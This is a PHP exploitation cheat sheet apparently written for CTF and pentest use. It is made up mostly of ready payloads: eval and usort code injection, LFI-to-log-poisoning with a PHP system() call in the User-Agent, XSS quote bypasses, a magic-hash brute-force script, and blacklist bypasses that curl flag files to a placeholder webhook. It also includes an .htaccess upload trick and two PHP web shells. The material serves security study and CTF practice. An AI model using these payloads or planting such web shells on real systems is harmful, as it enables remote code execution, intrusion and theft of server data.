# PHP Tricks

## Blogs

* <https://arxenix.dev/pwning-php/>

## addslashes()

This function escapes single & double quotes.

```
# Assuming that the variable is passed to eval
${system($_GET[1])}&1=whoami;
```

> **References:** <https://www.programmersought.com/article/30723400042/>

## include()

Only generates a warning, i.e., E\_WARNING, and continue the execution of the script.

**Case**: From LFI to log poisoning

* Burpsuite request example:

```
# Cookie Serialization exploit
# O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}

GET /?c=cat+/flag_qlvM8 HTTP/1.1
Host: 178.128.163.152:30522
User-Agent: Mozilla/5.0 <?php system($_GET['c']); ?> Gecko/20100101 Firefox/99.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQ==
Upgrade-Insecure-Requests: 1
DNT: 1
Sec-GPC: 1
```

> **References:**<https://www.hackingarticles.in/apache-log-poisoning-through-lfi/>

## htmlentities() & htmlspecialchars

It doesn't encode single quotes by default

```
'onerror='alert("XSS")''
```

> **Reference**: <https://github.com/X-Vector/XSS_Bypass/blob/master/htmlspecialchars%20-%20htmlentities/README.md>

## Loose Comparison

* `===`

```
<?php
if(NULL === NULL){ echo "Equal"; } else{ echo "not Equal"; }
?>
// Equal
```

* `==`

```
<?php 
if(NULL == ''){ echo "Equal"; } else{ echo "not Equal"; }
?>
// Equal
```

* **Bruteforce**

Assuming the following code

```
if ($results[0]['password'] != substr(md5($username . $password), 0, 20)) {
    return 'Invalid credalo';
```

```
import hashlib
 
username = 'admin'
target = '0e'
candidate = 0;
while True:
   plaintext = username+target+str(candidate)
   hash = hashlib.md5(plaintext.encode('ascii')).hexdigest()
   # Hash starts with “0e”
   if hash[:2] == target:
       # Hash contains only one letter (“e”) in first twenty characters
       # So it can be considered as a number by PHP
       if sum(c.isalpha() for c in hash[:20]) == 1:
           print('username and password:' + plaintext);
           break
   candidate = candidate + 1
```

## Eval()

Always pay attention to the behaviour and aim to fix the syntax in order to achieve code execution. Taking the code below as an example, we can achieve code execution by payloads such like:

* `".system("ls")."`

```
<?php
  if (!isset($_GET["name"])) {
    header("Location: /?name=hacker");
    die();
  }
  require "header.php";
?>
  $str="echo \"Hello ".$_GET['name']."!!!\";";
  eval($str);
?>
<?php
  require "footer.php";
?>
```

The challenge here is to break out of the code syntax and keep a clean syntax. There are many ways to do it:

* **By adding dummy code**

```
".system('uname -a'); $dummy="
```

* **By using comment**

```
".system('uname -a');#
".system('uname -a');//
```

## usort()

When ordering information, developers can use two methods:

* `order by` in a SQL request;
* `usort` in PHP code. The function `usort` is often used with the function `create_function` to dynamically generate the "sorting" function, based on user-controlled information. If the web application lacks potent filtering and validation, this can lead to code execution.

```
?order=id);}system('uname%20-a');//
```

## die()

`die` function in PHP can run any system command before quitting the flow of the program

```
die(system(ls))
```

## **strpos()**

Many Application uses strpos() to check for malicious inputs in the file parameter. **strpos()** finds the position of the first occurrence of a substring in a string, it returns False if the given substring is not found in the given string.

```
assert("strpos('$file', '..') === false") or die("Detected LFI attempt!");
```

This kind of filter can be found in many CTF’s or even in real life to protect the Application from LFI Attacks. This filter checks the `file` variable for any `..` pattern and if it's found then the program terminates.

We can use the same technique used above but here we have one extra function (strpos) that we need to bypass in order to run our command directly to the assert function.

`' and die(system(ls))or '` , this payload can be used to break out of strpos() and interact

with the assert() function directly, and again we can run any arbitrary command on the Server. (Doesn't work from php 8)

## preg\_match

Take the following code snippet as an example:

```
if(isset($_GET['url'])){
        $output = file_get_contents($_GET['url']);
            $result = str_replace(' ', '', $output);
            if(preg_match("/eval|system|shell_exec|echo|print|passthru|fwrite|fsockopen|explode|cat/", $result)){
                    die("Not allowed");
                    }
```

* Bypass

```
$a="sys";$a.="tem";$a('ls')
```

## Bypasses

### Filtered Spaces

Taking below Code Challenge as an example

```
if(isset($_GET['url'])){
        $output = file_get_contents($_GET['url']);
            $result = str_replace(' ', '', $output);
            if(preg_match("/eval|system|shell_exec|echo|print|passthru|fwrite|fsockopen|explode|cat/", $result)){
                    die("Not allowed");
                    }
            else{
                    $filename = time().".php";
                    file_put_contents($filename, $result);
            }
}
else{
    highlight_file(__file__);
}
```

We have to inject a payload that doesn't contain spaces and blacklisted functions, So that the payloads would be:

```
# The quoting is mandatory between tac, or the payload won't work.
<?=exec('curl${IFS}-XPOST${IFS}-d${IFS}"`tac${IFS}/var/www/html/flag.php`"${IFS}<WEBHOOK>')?>
# Using Highlight_File()
<?=highlight_file("/var/www/html/flag.php");?>
# If a for loop was set to check on a blacklist
<?=exec('curl${IFS}-XPOST${IFS}-d${IFS}"`gzip${IFS}-c${IFS}/var/www/html/flag.php${IFS}0>&1|zcat`"${IFS}<WEBHOOK>')?>
```

## time()

You can guess the specified file or whatever by converting the response time and converting it to epoch time stamp using <https://www.epochconverter.com/>

## PHP Filter Chain

* <https://github.com/synacktiv/php_filter_chain_generator>

## .htaccess

```
#define width 1337
#define height 1337

AddType application/x-httpd-php .shell
php_value zend.multibyte 1
php_value zend.detect_unicode 1
php_value display_errors 1
```

Shell

```
<?php system($_GET['cmd']); die(); ?>

#define width 1337
#define height 1337
```

## proc\_open web shell

```
<?php

$descriptors = [['pipe', 'r'], ['pipe', 'w'], ['pipe', 'w']];

$CMD = $_GET['abuqasem'];

$handle = proc_open($CMD, $descriptors, $pipes, null, ['USER' => 'guest']);

$world = stream_get_contents($pipes[1]);

var_dump($world);?>
```

## extract()

```
<?php extract($_GET); $ctx($str);?>
// ?ctx=system&str=id
```

